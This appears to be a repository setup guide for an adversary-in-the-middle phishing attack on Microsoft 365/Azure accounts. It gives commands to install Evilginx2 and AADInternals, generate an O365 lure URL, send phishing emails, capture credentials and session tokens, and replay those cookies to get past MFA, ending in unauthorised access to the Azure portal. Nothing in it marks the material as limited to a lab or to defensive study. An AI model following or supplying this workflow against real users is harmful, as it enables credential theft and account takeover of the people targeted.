# Complete Setup Guide

## Prerequisites Checklist
- [ ] Azure subscription (free trial works)
- [ ] Domain name registered
- [ ] Linux VPS (2GB RAM minimum)
- [ ] PowerShell 7+
- [ ] Basic networking knowledge

## Step-by-Step Instructions

### Phase 1: Environment Setup

1. **Domain & Infrastructure**
   ```bash
   # Register domain via Namecheap
   # Configure DNS records
   # Deploy DigitalOcean VPS (Ubuntu 22.04 recommended)
   ```

2. **Azure Tenant Configuration**
   ```powershell
   # Install Azure PowerShell module
   Install-Module -Name Az -AllowClobber -Scope CurrentUser -Force
   
   # Run user provisioning script
   .\scripts\azure-setup\Create_Microsoft_Entra_ID_Users.ps1
   ```

3. **AADInternals Reconnaissance**
   ```powershell
   # Install AADInternals
   Install-Module AADInternals
   
   # Run reconnaissance commands
   .\scripts\reconnaissance\AADInternals_Commands.ps1
   ```

### Phase 2: Attack Infrastructure

1. **Evilginx2 Setup**
   ```bash
   # SSH into VPS
   ssh root@your-vps-ip
   
   # Install Evilginx2
   git clone https://github.com/kgretzky/evilginx2.git
   cd evilginx2
   make
   
   # Configure phishlet (see evilginx/setup-instructions.md)
   ```

2. **Generate Lure URL**
   ```bash
   # Start Evilginx2
   ./evilginx2
   
   # Generate phishing link
   lures create o365
   lures get-url <lure_id>
   ```

### Phase 3: Phishing Campaign

1. **Craft Phishing Email** (see `phishing-templates/email-templates/`)
2. **Send to Target User**
3. **Monitor Evilginx2 Dashboard**
4. **Capture Credentials & Tokens**

### Phase 4: Session Hijacking

1. **Export Captured Tokens**
2. **Import to Cookie-Editor Browser Extension**
3. **Access Target Account (MFA Bypassed)**

## 📊 Attack Flow Diagram

```
[Reconnaissance] → [Infrastructure Setup] → [Phishing Email] → [User Clicks Link]
                                                                      ↓
[Session Hijacking] ← [Token Captured] ← [User Authenticates with MFA]
        ↓
[Unauthorized Access to Azure Portal]
```

